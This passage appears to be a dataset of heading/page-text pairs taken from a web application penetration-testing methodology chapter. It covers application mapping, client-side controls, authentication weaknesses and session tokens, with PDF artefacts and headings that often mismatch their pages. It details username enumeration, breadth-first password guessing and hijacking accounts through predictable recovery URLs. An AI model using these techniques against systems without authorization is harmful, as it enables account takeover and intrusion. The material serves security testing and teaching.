to access individual functions. For example, if the applica-\ntion uses a parameter containing a function name, fi rst determine its\nbehavior when an invalid function is specifi ed, and try to establish an\neasy way to identify when a valid function has been requested. Compile\na list of common function names or cycle through the syntactic range of\nidentifi ers observed to be in use. Automate the exercise to enumerate\nvalid functionality as quickly and easily as possible.\ncc2211..iinndddd 779977 88//1199//22001111 1122::2222::0011 PPMM"
  },
  {
    "input": "2.1 Identify Functionality",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 798\n798 Chapter 21 n A Web Application Hacker’s Methodology\n1.5.3 If applicable, compile a map of application content based on functional paths,\nrather than URLs, showing all the enumerated functions and the logical\npaths and dependencies between them. (See Chapter 4 for an example.)\n1.6 Test for Debug Parameters\n1.6.1 Choose one or more application pages or functions where hidden debug\nparameters (such as debug=true) may be implemented. These are most\nlikely to appear in key functionality such as login, search, and fi le upload\nor download.\n1.6.2 Use listings of common debug parameter names (such as debug,test,\nhide, and source) and common values (such as true,yes, on, and 1).\nIterate through all permutations of these, submitting each name/value\npair to each targeted function. For POST requests, supply the parameter\nin both the URL query string and the request body. Use the techniques\ndescribed in Chapter 14 to automate this exercise. For example, you\ncan use the cluster bomb attack type in Burp Intruder to combine all\npermutations of two payload lists.\n1.6.3 Review the application’s responses for any anomalies that may indicate\nthat the added parameter has had an effect on the application’s processing.\n2 Analyze the Application\n2.1. Identify 2.2. Identify data 2.3. Identify\nfunctionality entry points technologies\n2.4. Map the attack surface\nFigure 21-3: Analyzing the application\n2.1 Identify Functionality\n2.1.1 Identify the core functionality that the application was created for and\nthe actions that each function is designed to perform when used as\nintended.\n2.1.2 Identify the core security mechanisms employed by the application and\nhow they work. In particular, understand the key mechanisms that handle\ncc2211..iinndddd 779988 88//1199//22001111 1122::2222::0011 PPMM"
  },
  {
    "input": "2.3 Identify the Technologies Used",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 799\nChapter 21 n A Web Application Hacker’s Methodology 799\nauthentication, session management, and access control, and the functions\nthat support them, such as user registration and account recovery.\n2.1.3 Identify all the more peripheral functions and behavior, such as the use\nof redirects, off-site links, error messages, and administrative and log-\nging functions.\n2.1.4 Identify any functionality that diverges from the standard GUI appear-\nance, parameter naming, or navigation mechanism used elsewhere in\nthe application, and single it out for in-depth testing.\n2.2 Identify Data Entry Points\n2.2.1 Identify all the different entry points that exist for introducing user\ninput into the application’s processing, including URLs, query string\nparameters,POST data, cookies, and other HTTP headers processed by\nthe application.\n2.2.2 Examine any customized data transmission or encoding mechanisms\nused by the application, such as a nonstandard query string format.\nUnderstand whether the data being submitted encapsulates parameter\nnames and values, or whether an alternative means of representation\nis being used.\n2.2.3 Identify any out-of-band channels via which user-controllable or other\nthird-party data is being introduced into the application’s processing.\nAn example is a web mail application that processes and renders mes-\nsages received via SMTP.\n2.3 Identify the Technologies Used\n2.3.1 Identify each of the different technologies used on the client side, such as\nforms, scripts, cookies, Java applets, ActiveX controls, and Flash objects.\n2.3.2 As far as possible, establish which technologies are being used on the\nserver side, including scripting languages, application platforms, and\ninteraction with back-end components such as databases and e-mail\nsystems.\n2.3.3 Check the HTTP Server header returned in application responses, and\nalso check for any other software identifi ers contained within custom\nHTTP headers or HTML source code comments. Note that in some cases,\ndifferent areas of the application are handled by different back-end\ncomponents, so different banners may be received.\n2.3.4 Run the Httprint tool to fi ngerprint the web server.\n2.3.5 Review the results of your content-mapping exercises to identify any\ninteresting-looking fi le extensions, directories, or other URL subsequences\ncc2211..iinndddd 779999 88//1199//22001111 1122::2222::0011 PPMM"
  },
  {
    "input": "3 Test Client-Side Controls",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 800\n800 Chapter 21 n A Web Application Hacker’s Methodology\nthat may provide clues about the technologies in use on the server.\nReview the names of any session tokens and other cookies issued. Use\nGoogle to search for technologies associated with these items.\n2.3.6 Identify any interesting-looking script names and query string parameters\nthat may belong to third-party code components. Search for these on\nGoogle using the inurl: qualifi er to fi nd any other applications using\nthe same scripts and parameters and that therefore may be using the\nsame third-party components. Perform a noninvasive review of these\nsites, because this may uncover additional content and functionality that\nis not explicitly linked on the application you are attacking.\n2.4 Map the Attack Surface\n2.4.1 Try to ascertain the likely internal structure and functionality of the\nserver-side application and the mechanisms it uses behind the scenes\nto deliver the behavior that is visible from the client perspective. For\nexample, a function to retrieve customer orders is likely to be interacting\nwith a database.\n2.4.2 For each item of functionality, identify the kinds of common vulnerabilities\nthat are often associated with it. For example, fi le upload functions may\nbe vulnerable to path traversal, inter-user messaging may be vulnerable\nto XSS, and Contact Us functions may be vulnerable to SMTP injection.\nSee Chapter 4 for examples of vulnerabilities commonly associated with\nparticular functions and technologies.\n2.4.3 Formulate a plan of attack, prioritizing the most interesting-looking\nfunctionality and the most serious of the potential vulnerabilities associ-\nated with it. Use your plan to guide the amount of time and effort you\ndevote to each of the remaining areas of this methodology.\n3 Test Client-Side Controls\n3.1. Transmission of 3.2. Client-side input 3.3. Browser\ndata via client controls Extensions\nHidden fields Length limits Java applets\nCookies JavaScript validation ActiveX controls\nPreset parameters Disabled elements Flash objects\nASP.NET ViewState Silverlight objects\nFigure 21-4: Testing client-side controls\ncc2211..iinndddd 880000 88//1199//22001111 1122::2222::0022 PPMM"
  },
  {
    "input": "3.2 Test Client-Side Controls Over User Input",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 801\nChapter 21 n A Web Application Hacker’s Methodology 801\n3.1 Test Transmission of Data Via the Client\n3.1.1 Locate all instances within the application where hidden form fi elds,\ncookies, and URL parameters are apparently being used to transmit\ndata via the client.\n3.1.2 Attempt to determine the purpose that the item plays in the applica-\ntion’s logic, based on the context in which it appears and on its name\nand value.\n3.1.3 Modify the item’s value in ways that are relevant to its role in the\napplication’s functionality. Determine whether the application pro-\ncesses arbitrary values submitted in the fi eld and whether this fact\ncan be exploited to interfere with the application’s logic or subvert\nany security controls.\n3.1.4 If the application transmits opaque data via the client, you can attack this\nin various ways. If the item is obfuscated, you may be able to decipher\nthe obfuscation algorithm and therefore submit arbitrary data within the\nopaque item. Even if it is securely encrypted, you may be able to replay\nthe item in other contexts to interfere with the application’s logic. See\nChapter 5 for more details on these and other attacks.\n3.1.5 If the application uses the ASP.NET ViewState, test to confi rm whether\nthis can be tampered with or whether it contains any sensitive infor-\nmation. Note that the ViewState may be used differently on different\napplication pages.\n3.1.5.1 Use the ViewState analyzer in Burp Suite to confi rm whether\nthe EnableViewStateMac option has been enabled, meaning\nthat the ViewState’s contents cannot be modifi ed.\n3.1.5.2 Review the decoded ViewState to identify any sensitive data it\ncontains.\n3.1.5.3 Modify one of the decoded parameter values and reencode and\nsubmit the ViewState. If the application accepts the modifi ed\nvalue, you should treat the ViewState as an input channel for\nintroducing arbitrary data into the application’s processing.\nPerform the same testing on the data it contains as you would\nfor any other request parameters.\n3.2 Test Client-Side Controls Over User Input\n3.2.1 Identify any cases where client-side controls such as length limits and\nJavaScript checks are used to validate user input before it is submitted\ncc2211..iinndddd 880011 88//1199//22001111 1122::2222::0022 PPMM"
  },
  {
    "input": "3.3 Test Browser Extension Components",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 802\n802 Chapter 21 n A Web Application Hacker’s Methodology\nto the server. These controls can be bypassed easily, because you can\nsend arbitrary requests to the server. For example:\n<form action=”order.asp” onsubmit=”return Validate(this)”>\n<input maxlength=”3” name=”quantity”>\n...\n3.2.2 Test each affected input fi eld in turn by submitting input that would\nordinarily be blocked by the client-side controls to verify whether these\nare replicated on the server.\n3.2.3 The ability to bypass client-side validation does not necessarily represent\nany vulnerability. Nevertheless, you should review closely what vali-\ndation is being performed. Confi rm whether the application is relying\non the client-side controls to protect itself from malformed input. Also\nconfi rm whether any exploitable conditions exist that can be triggered\nby such input.\n3.2.4 Review each HTML form to identify any disabled elements, such as\ngrayed-out submit buttons. For example:\n<input disabled=”true” name=”product”>\nIf you fi nd any, submit these to the server, along with the form’s other\nparameters. See whether the parameter has any effect on the server’s\nprocessing that you can leverage in an attack. Alternatively, use an\nautomated proxy rule to automatically enable disabled fi elds, such as\nBurp Proxy’s “HTML Modifi cation” rules.\n3.3 Test Browser Extension Components\n3.3.1 Understand the Client Application’s Operation\n3.3.1.1 Set up a local intercepting proxy for the client technology under review,\nand monitor all traffi c passing between the client and server. If data is\nserialized, use a deserialization tool such as Burp’s built-in AMF support\nor the DSer Burp plug-in for Java.\n3.3.1.2 Step through the functionality presented in the client. Determine any\npotentially sensitive or powerful functions, using standard tools within\nthe intercepting proxy to replay key requests or modify server responses.\n3.3.2 Decompile the Client\n3.3.2.1 Identify any applets employed by the application. Look for any of the\nfollowing fi le types being requested via your intercepting proxy:\nn .class, .jar : Java\nn .swf : Flash\nn .xap : Silverlight\ncc2211..iinndddd 880022 88//1199//22001111 1122::2222::0022 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 803\nChapter 21 n A Web Application Hacker’s Methodology 803\nYou can also look for applet tags within the HTML source code of\napplication pages. For example:\n<applet code=”input.class” id=”TheApplet” codebase=”/scripts/”></\napplet>\n3.3.2.2 Review all calls made to the applet’s methods from within the invoking\nHTML, and determine whether data returned from the applet is being\nsubmitted to the server. If this data is opaque (that is, obfuscated or\nencrypted), to modify it you will probably need to decompile the applet\nto obtain its source code.\n3.3.2.3 Download the applet bytecode by entering the URL into your browser,\nand save the fi le locally. The name of the bytecode fi le is specifi ed in\nthecode attribute of the applet tag. The fi le will be located in the direc-\ntory specifi ed in the codebase attribute if this is present. Otherwise, it\nwill be located in the same directory as the page in which the applet tag\nappears.\n3.3.2.4 Use a suitable tool to decompile the bytecode into source code. For\nexample:\nC:\\>jad.exe input.class\nParsing input.class... Generating input.jad\nHere are some suitable tools for decompiling different browser exten-\nsion components:\nn Java — Jad\nn Flash — SWFScan, Flasm/Flare\nn Silverlight — .NET Reflector\nIf the applet is packaged into a JAR, XAP, or SWF fi le, you can unpack\nit using a standard archive reader such as WinRar or WinZip.\n3.3.2.5 Review the relevant source code (starting with the implementation of\nthe method that returns the opaque data) to understand what processing\nis being performed.\n3.3.2.6 Determine whether the applet contains any public methods that can be\nused to perform the relevant obfuscation on arbitrary input.\n3.3.2.7 If it doesn’t, modify the applet’s source to neutralize any validation it\nperforms or to allow you to obfuscate arbitrary input. You can then\nrecompile the source into its original fi le format using the compilation\ntools provided by the vendor.\n3.3.3 Attach a Debugger\n3.3.3.1 For large client-side applications, it is often prohibitively diffi cult to\ndecompile the whole application, modify it, and repackage it without\ncc2211..iinndddd 880033 88//1199//22001111 1122::2222::0022 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 804\n804 Chapter 21 n A Web Application Hacker’s Methodology\nencountering numerous errors. For these applications it is generally\nquicker to attach a runtime debugger to the process. JavaSnoop does this\nvery well for Java. Silverlight Spy is a freely available tool that allows\nruntime monitoring of Silverlight clients.\n3.3.3.2 Locate the key functions and values the application employs to drive\nsecurity-related business logic, and place breakpoints when the targeted\nfunction is called. Modify the arguments or return value as needed to\naffect the security bypass.\n3.3.4 Test ActiveX controls\n3.3.4.1 Identify any ActiveX controls employed by the application. Look for\nany.cab fi le types being requested via your intercepting proxy, or look\nfor object tags within the HTML source code of application pages. For\nexample:\n<OBJECT\nclassid=”CLSID:4F878398-E58A-11D3-BEE9-00C04FA0D6BA”\ncodebase=”https://wahh app.com/scripts/input.cab”\nid=”TheAxControl”>\n</OBJECT>\n3.3.4.2 It is usually possible to subvert any input validation performed within\nan ActiveX control by attaching a debugger to the process and directly\nmodifying data being processed or altering the program’s execution\npath. See Chapter 5 for more details about this kind of attack.\n3.3.4.3 It is often possible to guess the purpose of different methods that an\nActiveX control exports based on their names and the parameters\npassed to them. Use the COMRaider tool to enumerate the methods\nexported by the control. Test whether any of these can be manipu-\nlated to affect the control’s behavior and defeat any validation tests\nit implements.\n3.3.4.4 If the control’s purpose is to gather or verify certain information about\nthe client computer, use the Filemon and Regmon tools to monitor the\ninformation the control gathers. It is often possible to create suitable\nitems within the system registry and fi lesystem to fi x the inputs used\nby the control and therefore affect its behavior.\n3.3.4.5 Test any ActiveX controls for vulnerabilities that could be exploited to\nattack other users of the application. You can modify the HTML used\nto invoke a control to pass arbitrary data to its methods and monitor\nthe results. Look for methods with dangerous-sounding names, such\nasLaunchExe. You can also use COMRaider to perform some basic fuzz\ntesting of ActiveX controls to identify fl aws such as buffer overfl ows.\ncc2211..iinndddd 880044 88//1199//22001111 1122::2222::0022 PPMM"
  },
  {
    "input": "4.1 Understand the Mechanism",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 805\nChapter 21 n A Web Application Hacker’s Methodology 805\n4 Test the Authentication Mechanism\n4.1. Understand the mechanism\nData attacks Special functions Credential handling Authentication\nlogic\n4.2. Test password 4.5. Test account 4.8. Test username 4.13.1. Test for\nquality recovery uniqueness fail-open logic\n4.3. Test for 4.13.2. Test\n4.6. Test “remember 4.9. Test credential\nusername multistage\nme” predictability\nenumeration processes\n4.7. Test\n4.4. Test for 4.10. Check for\nimpersonation\npassword guessing unsafe transmission\nfunctions\n4.11. Check for\nunsafe distribution\n4.12. Check for\ninsecure storage\n4.14. Exploit vulnerabilities\nFigure 21-5: Testing the authentication mechanism\n4.1 Understand the Mechanism\n4.1.1 Establish the authentication technologies in use (for example, forms,\ncertifi cates, or multifactor).\n4.1.2 Locate all the authentication-related functionality (including login,\nregistration, account recovery, and so on).\n4.1.3 If the application does not implement an automated self-registration\nmechanism, determine whether any other means exists of obtaining\nseveral user accounts.\ncc2211..iinndddd 880055 88//1199//22001111 1122::2222::0022 PPMM"
  },
  {
    "input": "4.3 Test for Username Enumeration",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 806\n806 Chapter 21 n A Web Application Hacker’s Methodology\n4.2 Test Password Quality\n4.2.1 Review the application for any description of the minimum quality rules\nenforced on user passwords.\n4.2.2 Attempt to set various kinds of weak passwords, using any self-registration\nor password change functions to establish the rules actually enforced.\nTry short passwords, alphabetic characters only, single-case characters\nonly, dictionary words, and the current username.\n4.2.3 Test for incomplete validation of credentials. Set a strong and complex\npassword (for example, 12 characters with mixed-case letters, numerals,\nand typographic characters). Attempt to log in using different varia-\ntions on this password, by removing the last character, by changing a\ncharacter’s case, and by removing any special characters. If any of these\nlogin attempts is successful, continue experimenting systematically to\nidentify what validation is actually being performed.\n4.2.4 Having established the minimum password quality rules, and the extent\nof password validation, identify the range of values that a password-\nguessing attack would need to employ to have a good probability of\nsuccess. Attempt to locate any built-in accounts that may not have been\nsubject to the standard password complexity requirements.\n4.3 Test for Username Enumeration\n4.3.1 Identify every location within the various authentication functions\nwhere a username is submitted, including via an on-screen input fi eld,\na hidden form fi eld, or a cookie. Common locations include the primary\nlogin, self-registration, password change, logout, and account recovery.\n4.3.2 For each location, submit two requests, containing a valid and an invalid\nusername. Review every detail of the server’s responses to each pair of\nrequests, including the HTTP status code, any redirects, information\ndisplayed on-screen, any differences hidden in the HTML page source,\nand the time taken for the server to respond. Note that some differences\nmay be subtle (for example, the same error message may contain minor\ntypographical differences). You can use the history function of your\nintercepting proxy to review all traffi c to and from the server. WebScarab\nhas a function to compare two responses to quickly highlight any dif-\nferences between them.\n4.3.3 If you observe any differences between the responses where a valid and\ninvalid username is submitted, repeat the test with a different pair of\nvalues and confi rm that a systematic difference exists that can provide\na basis for automated username enumeration.\ncc2211..iinndddd 880066 88//1199//22001111 1122::2222::0022 PPMM"
  },
  {
    "input": "4.5 Test Any Account Recovery Function",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 807\nChapter 21 n A Web Application Hacker’s Methodology 807\n4.3.4 Check for any other sources of information leakage within the applica-\ntion that may enable you to compile a list of valid usernames. Examples\nare logging functionality, actual listings of registered users, and direct\nmention of names or e-mail addresses in source code comments.\n4.3.5 Locate any subsidiary authentication that accepts a username, and\ndetermine whether it can be used for username enumeration. Pay\nspecifi c attention to a registration page that allows specifi cation of a\nusername.\n4.4 Test Resilience to Password Guessing\n4.4.1 Identify every location within the application where user credentials\nare submitted. The two main instances typically are the main login\nfunction and the password change function. The latter normally is a\nvalid target for password-guessing attacks only if an arbitrary username\ncan be supplied.\n4.4.2 At each location, using an account that you control, manually send\nseveral requests containing the valid username but other invalid\ncredentials. Monitor the application’s responses to identify any differ-\nences. After about 10 failed logins, if the application has not returned\na message about account lockout, submit a request containing valid\ncredentials. If this request succeeds, an account lockout policy prob-\nably is not in force.\n4.4.3 If you do not control any accounts, attempt to enumerate or guess a\nvalid username, and make several invalid requests using this guess,\nmonitoring for any error messages about account lockout. Of course,\nyou should be aware that this test may have the effect of suspending or\ndisabling an account belonging to another user.\n4.5 Test Any Account Recovery Function\n4.5.1 Identify whether the application contains any facility for users to regain\ncontrol of their account if they have forgotten their credentials. This\nis often indicated by a Forgot Your Password link near the main login\nfunction.\n4.5.2 Establish how the account recovery function works by doing a complete\nwalk-through of the recovery process using an account you control.\n4.5.3 If the function uses a challenge such as a secret question, determine\nwhether users can set or select their own challenge during registration.\nIf so, use a list of enumerated or common usernames to harvest a list of\nchallenges, and review this for any that appear to be easily guessable.\ncc2211..iinndddd 880077 88//1199//22001111 1122::2222::0022 PPMM"
  },
  {
    "input": "4.7 Test Any Impersonation Function",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 808\n808 Chapter 21 n A Web Application Hacker’s Methodology\n4.5.4 If the function uses a password hint, perform the same exercise to har-\nvest a list of password hints, and identify any that appear to be easily\nguessable.\n4.5.5 Perform the same tests on any account-recovery challenges that you per-\nformed at the main login function to assess vulnerability to automated\nguessing attacks.\n4.5.6 If the function involves sending an e-mail to the user to complete the\nrecovery process, look for any weaknesses that may enable you to take\ncontrol of other users’ accounts. Determine whether it is possible to\ncontrol the address to which the e-mail is sent. If the message contains\na unique recovery URL, obtain a number of messages using an e-mail\naddress you control, and attempt to identify any patterns that may enable\nyou to predict the URLs issued to other users. Apply the methodology\ndescribed in step 5.3 to identify any predictable sequences.\n4.6 Test Any Remember Me Function\n4.6.1 If the main login function or its supporting logic contains a Remember\nMe function, activate this and review its effects. If this function allows the\nuser to log in on subsequent occasions without entering any credentials,\nyou should review it closely for any vulnerabilities.\n4.6.2 Closely inspect all persistent cookies that are set when the Remember Me\nfunction is activated. Look for any data that identifi es the user explicitly\nor appears to contain some predictable identifi er of the user.\n4.6.3 Even where the data stored appears to be heavily encoded or obfuscated,\nreview this closely, and compare the results of remembering several very\nsimilar usernames and/or passwords to identify any opportunities to\nreverse-engineer the original data. Apply the methodology described\nin step 5.2 to identify any meaningful data.\n4.6.4 Depending on your results, modify the contents of your cookie in suit-\nable ways in an attempt to masquerade as other users of the application.\n4.7 Test Any Impersonation Function\n4.7.1 If the application contains any explicit functionality that allows one\nuser to impersonate another, review this closely for any vulnerabilities\nthat may enable you to impersonate arbitrary users without proper\nauthorization.\n4.7.2 Look for any user-supplied data that is used to determine the target\nof the impersonation. Attempt to manipulate this to impersonate\ncc2211..iinndddd 880088 88//1199//22001111 1122::2222::0022 PPMM"
  },
  {
    "input": "4.9 Test Predictability of Autogenerated Credentials",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 809\nChapter 21 n A Web Application Hacker’s Methodology 809\nother users, particularly administrative users, which may enable you\nescalate privileges.\n4.7.3 If you perform any automated password-guessing attacks against other\nuser accounts, look for any accounts that appear to have more than one\nvalid password, or multiple accounts that appear to have the same pass-\nword. This may indicate the presence of a backdoor password, which\nadministrators can use to access the application as any user.\n4.8 Test Username Uniqueness\n4.8.1 If the application has a self-registration function that lets you specify\na desired username, attempt to register the same username twice with\ndifferent passwords.\n4.8.2 If the application blocks the second registration attempt, you can exploit\nthis behavior to enumerate registered usernames.\n4.8.3 If the application registers both accounts, probe further to determine its\nbehavior when a collision of username and password occurs. Attempt\nto change the password of one of the accounts to match that of the\nother. Also, attempt to register two accounts with identical usernames\nand passwords.\n4.8.4 If the application alerts you or generates an error when a collision of\nusername and password occurs, you can probably exploit this to perform\nan automated guessing attack to discover another user’s password. Target\nan enumerated or guessed username, and attempt to create accounts\nthat have this username and different passwords. When the applica-\ntion rejects a specifi c password, you have probably found the existing\npassword for the targeted account.\n4.8.5 If the application appears to tolerate a collision of username and pass-\nword without an error, log in using the colliding credentials. Determine\nwhat happens and whether the application’s behavior can be leveraged\nto gain unauthorized access to other users’ accounts.\n4.9 Test Predictability of Autogenerated Credentials\n4.9.1 If the application automatically generates usernames or passwords, try\nto obtain several values in quick succession and identify any detectable\nsequences or patterns.\n4.9.2 If usernames are generated in a predictable way, extrapolate backwards\nto obtain a list of possible valid usernames. You can use this as the basis\nfor automated password-guessing and other attacks.\ncc2211..iinndddd 880099 88//1199//22001111 1122::2222::0022 PPMM"
  },
  {
    "input": "4.11 Check for Unsafe Distribution of Credentials",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 810\n810 Chapter 21 n A Web Application Hacker’s Methodology\n4.9.3 If passwords are generated in a predictable way, extrapolate the pattern\nto obtain a list of possible passwords issued to other application users.\nThis can be combined with any lists of usernames you obtain to perform\na password-guessing attack.\n4.10 Check for Unsafe Transmission of Credentials\n4.10.1 Walk through all authentication-related functions that involve trans-\nmission of credentials, including the main login, account registration,\npassword change, and any page that allows viewing or updating of\nuser profi le information. Monitor all traffi c passing in both directions\nbetween the client and server using your intercepting proxy.\n4.10.2 Identify every case in which the credentials are transmitted in either\ndirection. You can set interception rules in your proxy to fl ag messages\ncontaining specifi c strings.\n4.10.3 If credentials are ever transmitted in the URL query string, these are\npotentially vulnerable to disclosure in the browser history, on-screen,\nin server logs, and in the Referer header when third-party links are\nfollowed.\n4.10.4 If credentials are ever stored in a cookie, these are potentially vulnerable\nto disclosure via XSS attacks or local privacy attacks.\n4.10.5 If credentials are ever transmitted from the server to the client, these\nmay be compromised via any vulnerabilities in session management or\naccess controls, or in an XSS attack.\n4.10.6 If credentials are ever transmitted over an unencrypted connection, these\nare vulnerable to interception by an eavesdropper.\n4.10.7 If credentials are submitted using HTTPS but the login form itself is\nloaded using HTTP, the application is vulnerable to a man-in-the-middle\nattack that may be used to capture credentials.\n4.11 Check for Unsafe Distribution of Credentials\n4.11.1 If accounts are created via some out-of-band channel, or the applica-\ntion has a self-registration function that does not itself determine all of\na user’s initial credentials, establish the means by which credentials are\ndistributed to new users. Common methods include sending a message\nto an e-mail or postal address.\ncc2211..iinndddd 881100 88//1199//22001111 1122::2222::0022 PPMM"
  },
  {
    "input": "4.13 Test for Logic Flaws",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 811\nChapter 21 n A Web Application Hacker’s Methodology 811\n4.11.2 If the application generates account activation URLs that are distributed\nout-of-band, try to register several new accounts in close succession,\nand identify any sequence in the URLs you receive. If a pattern can\nbe determined, try to predict the URLs sent to recent and forthcom-\ning users, and attempt to use these URLs to take ownership of their\naccounts.\n4.11.3 Try to reuse a single activation URL multiple times, and see if the appli-\ncation allows this. If it doesn’t, try locking out the target account before\nreusing the URL, and see if the URL still works. Determine whether this\nenables you to set a new password on an active account.\n4.12 Test for Insecure Storage\n4.12.1 If you gain access to hashed passwords, check for accounts that share\nthe same hashed password value. Try to log in with common passwords\nfor the most common hashed value.\n4.12.2 Use an offl ine rainbow table for the hashing algorithm in question to\nrecover the cleartext value.\n4.13 Test for Logic Flaws\n4.13.1 Test for Fail-Open Conditions\n4.13.1.1 For each function in which the application checks a user’s credentials,\nincluding the login and password change functions, walk through the\nprocess in the normal way, using an account you control. Note every\nrequest parameter submitted to the application.\n4.13.1.2 Repeat the process numerous times, modifying each parameter in turn\nin various unexpected ways designed to interfere with the application’s\nlogic. For each parameter, include the following changes:\nn Submit an empty string as the value.\nn Remove the name/value pair.\nn Submit very long and very short values.\nn Submit strings instead of numbers, and vice versa.\nn Submit the same named parameter multiple times, with the same\nand different values.\ncc2211..iinndddd 881111 88//1199//22001111 1122::2222::0022 PPMM\nStuttard c21.indd V3 - 08/16/2011 Page 812\n812 Chapter 21 n A Web Application Hacker’s Methodology\n4.13.1.3 Review closely the application’s responses to the preceding requests. If\nany unexpected divergences from the base case occur, feed this obser-\nvation back into your framing of further test cases. If one modifi cation\ncauses a change in behavior, try to combine this with other changes to\npush the application’s logic to its limits.\n4.13.2 Test Any Multistage Mechanisms\n4.13.2.1 If any authentication-related function involves submitting credentials\nin a series of different requests, identify the apparent purpose of each\ndistinct stage, and note the parameters submitted at each stage.\n4.13.2.2 Repeat the process numerous times, modifying the sequence of requests\nin ways designed to interfere with the application’s logic, including\nthe following tests:\nn Proceed through all stages, but in a different sequence than the one\nintended.\nn Proceed directly to each stage in turn, and continue the normal\nsequence from there.\nn Proceed through the normal sequence several times, skipping each\nstage in turn, and continuing the normal sequence from the next stage.\nn On the basis of your observations and the apparent purpose of each\nstage of the mechanism, try to think of further ways to modify the\nsequence and to access the different stages that the developers may\nnot have anticipated.\n4.13.2.3 Determine whether any single piece of information (such as the user-\nname) is submitted at more than one stage, either because it is captured\nmore than once from the user or because it is transmitted via the client\nin a hidden form fi eld, cookie, or preset query string parameter. If so, try\nsubmitting different values at different stages (both valid and invalid)\nand observing the effect. Try to determine whether the submitted item\nis sometimes superfl uous, or is validated at one stage and then trusted\nsubsequently, or is validated at different stages against different checks.\nTry to exploit the application’s behavior to gain unauthorized access\nor reduce the effectiveness of the controls imposed by the mechanism.\n4.13.2.4 Look for any data that is transmitted via the client that has not been\ncaptured from the user at any point. If hidden parameters are used\ncc2211..iinndddd 881122 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "4.14 Exploit Any Vulnerabilities to Gain Unauthorized Access",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 813\nChapter 21 n A Web Application Hacker’s Methodology 813\nto track the state of the process across successive stages, it may be\npossible to interfere with the application’s logic by modifying these\nparameters in crafted ways.\n4.13.2.5 If any part of the process involves the application’s presenting a ran-\ndomly varying challenge, test for two common defects:\nn If a parameter specifying the challenge is submitted along with the\nuser’s response, determine whether you can effectively choose your\nown challenge by modifying this value.\nn Try proceeding as far as the varying challenge several times with\nthe same username, and determine whether a different challenge\nis presented. If it is, you can effectively choose your own chal-\nlenge by proceeding to this stage repeatedly until your desired\nchallenge is presented.\n4.14 Exploit Any Vulnerabilities to Gain\nUnauthorized Access\n4.14.1 Review any vulnerabilities you have identifi ed within the various authen-\ntication functions, and identify any that you can leverage to achieve\nyour objectives in attacking the application. This typically involves\nattempting to authenticate as a different user — if possible, a user with\nadministrative privileges.\n4.14.2 Before mounting any kind of automated attack, note any account\nlockout defenses you have identifi ed. For example, when performing\nusername enumeration against a login function, submit a common\npassword with each request rather than a completely arbitrary value\nso as not to waste a failed login attempt on every username discovered.\nSimilarly, perform any password-guessing attacks on a breadth-fi rst,\nnot depth-fi rst, basis. Start your word list with the most common weak\npasswords, and proceed through this list, trying each item against\nevery enumerated username.\n4.14.3 Take account of the password quality rules and the completeness of\npassword validation when constructing word lists to use in any password-\nguessing attack to avoid impossible or superfl uous test cases.\n4.14.4 Use the techniques described in Chapter 14 to automate as much\nwork as possible and maximize the speed and effectiveness of your\nattacks.\ncc2211..iinndddd 881133 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "5.1 Understand the Mechanism",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 814\n814 Chapter 21 n A Web Application Hacker’s Methodology\n5 Test the Session Management Mechanism\n5.1. Understand the mechanism\nToken generation Token handling\n5.2. Test for meaning 5.4. Check for insecure transmission\n5.3. Test for predictability 5.5. Check for disclosure in logs\n5.6. Test mapping of tokens to sessions\n5.7. Test session termination\n5.8. Test for session fixation\n5.9. Check for CSRF\n5.10. Check cookie scope\nFigure 21-6: Testing the session management mechanism\n5.1 Understand the Mechanism\n5.1.1 Analyze the mechanism used to manage sessions and state. Establish\nwhether the application uses session tokens or some other method of\nhandling the series of requests received from each user. Note that some\nauthentication technologies (such as HTTP authentication) may not\nrequire a full session mechanism to reidentify users post-authentication.\nAlso, some applications use a sessionless state mechanism in which all\nstate information is transmitted via the client, usually in an encrypted\nor obfuscated form.\n5.1.2 If the application uses session tokens, confi rm precisely which pieces\nof data are actually used to reidentify users. Items that may be used to\ntransmit tokens include HTTP cookies, query string parameters, and\nhidden form fi elds. Several different pieces of data may be used collec-\ntively to reidentify the user, and different items may be used by different\nback-end components. Often, items that look like session tokens may\nnot actually be employed as such by the application, such as the default\ncookie generated by the web server.\ncc2211..iinndddd 881144 88//1199//22001111 1122::2222::0033 PPMM"
  },
  {
    "input": "5.2 Test Tokens for Meaning",
    "output": "Stuttard c21.indd V3 - 08/16/2011 Page 815\nChapter 21 n A Web Application Hacker’s Methodology 815\n5.1.3 To verify which items are actually being employed as session tokens,\nfi nd a page or function that is certainly session-dependent (such as a\nuser-specifi c My Details page). Then make several requests for it, sys-\ntematically removing each item you suspect is being used as a session\ntoken. If removing an item stops the session-dependent page from being\nreturned, this may confi rm that the item is a session token. Burp Repeater\nis a useful tool for performing these tests.\n5.1.4 Having established which items of data are actually being used to reiden-\ntify users, for each token confi rm whether it is being validated in its\nentirety, or whether some subcomponents of the token are ignored.\nChange the token’s value 1 byte at a time, and check whether the modi-\nfi ed value is still accepted. If you fi nd that certain portions of the token\nare not actually used to maintain session state, you can exclude these\nfrom further analysis.\n5.2 Test Tokens for Meaning\n5.2.1 Log in as several different users at different times, and record the tokens\nreceived from the server. If self-registration is available and you can choose\nyour username, log in with a series of similar usernames that have small\nvariations, such as A, AA, AAA, AAAA, AAAB, AAAC, AABA, and so\non. If other user-specifi c data is submitted at the login or is stored in user\nprofi les (such as an e-mail address), perform a similar exercise to modify\nthat data systematically and capture the resulting tokens.\n5.2.2 Analyze the tokens you receive for any correlations that appear to be\nrelated to the username and other user-controllable data.\n5.2.3 Analyze the tokens for any detectable encoding or obfuscation. Look\nfor a correlation between the length of the username and the length 